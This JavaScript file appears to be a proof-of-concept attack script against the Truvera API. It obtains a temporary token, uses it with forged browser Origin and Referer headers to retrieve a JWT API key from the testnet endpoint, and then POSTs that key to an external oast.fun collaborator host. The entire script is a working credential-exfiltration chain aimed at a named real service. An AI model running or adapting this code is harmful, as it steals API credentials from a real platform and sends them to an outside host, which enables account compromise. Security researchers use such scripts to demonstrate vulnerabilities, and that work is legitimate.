// Step 1: Fetch temporary key
async function getTemporaryKey() {
    try {
        const response = await fetch('https://truvera.io/api/temporary-key?t=1');
        const data = await response.json();

        if (!data.key) throw new Error('API token not found');

        const apiToken = data.key;
        console.log('Retrieved API Token:', apiToken);

        return apiToken;
    } catch (error) {
        console.error('Error fetching temporary key:', error);
    }
}

// Step 2: Use the token to fetch the actual API key
async function getApiKey(apiToken) {
    try {
        const response = await fetch('https://api-testnet.truvera.io/keys', {
            method: 'POST',
            headers: {
                'Dock-Api-Token': apiToken,
                'Sec-Ch-Ua-Platform': 'macOS',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
                'Accept': 'application/json',
                'Content-Type': 'application/json',
                'Origin': 'https://truvera.io',
                'Referer': 'https://truvera.io/'
            }
        });

        const data = await response.json();
        if (!data.jwt) throw new Error('API key not found');

        console.log('Retrieved API Key:', data.jwt);

        return data;
    } catch (error) {
        console.error('Error fetching API key:', error);
    }
}

// Step 3: Send data to external endpoint
async function sendToOast(data) {
    try {
        await fetch('https://yklewjpwigjupbnmpcibl32szx9gagjq6.oast.fun', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        });

        console.log('Data sent to oast.fun');
    } catch (error) {
        console.error('Error sending data to oast.fun:', error);
    }
}

// Execute the workflow
(async () => {
    const apiToken = await getTemporaryKey();
    if (!apiToken) return;

    const apiKeyData = await getApiKey(apiToken);
    if (!apiKeyData) return;

    await sendToOast(apiKeyData);
})();
